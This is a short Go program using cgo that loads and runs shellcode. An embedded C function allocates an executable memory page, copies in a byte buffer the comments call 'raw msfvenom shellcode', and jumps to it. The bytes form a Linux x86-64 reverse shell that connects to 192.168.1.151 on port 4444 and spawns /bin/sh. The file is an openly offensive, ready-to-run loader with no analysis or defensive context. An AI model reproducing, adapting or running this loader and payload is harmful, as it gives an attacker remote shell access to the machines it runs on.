package main

/*
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>

void execute_shellcode(const char* shellcode, size_t size) {
    // 1. Allocate an executable memory page via native C mmap
    void* ptr = mmap(0, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (ptr == MAP_FAILED) {
        return;
    }

    // 2. Copy the shellcode into the RWX page
    memcpy(ptr, shellcode, size);

    // 3. Cast the memory pointer to a C function pointer and execute it
    void (*func)() = ptr;
    func();
}
*/
import "C"

func main() {
	// Your raw msfvenom shellcode
	buf := []byte(
		"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97" +
			"\x48\xb9\x02\x00\x11\x5c\xc0\xa8\x01\x97\x51\x48\x89\xe6" +
			"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce" +
			"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f" +
			"\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48" +
			"\x89\xe6\x0f\x05",
	)

	// Pass the byte slice pointer and its length safely to the C function
	C.execute_shellcode((*C.char)(C.CBytes(buf)), C.size_t(len(buf)))
}
